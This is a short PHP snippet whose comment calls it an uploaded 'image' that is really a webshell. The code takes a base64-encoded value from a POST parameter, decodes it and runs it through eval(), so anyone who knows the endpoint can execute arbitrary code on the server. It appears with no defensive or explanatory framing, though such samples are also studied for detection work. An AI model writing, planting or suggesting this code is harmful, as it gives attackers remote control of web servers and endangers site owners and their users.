<?php
// Uploaded "image" that is really a webshell.
$key = $_POST['key'];
$payload = base64_decode($key);
eval($payload);
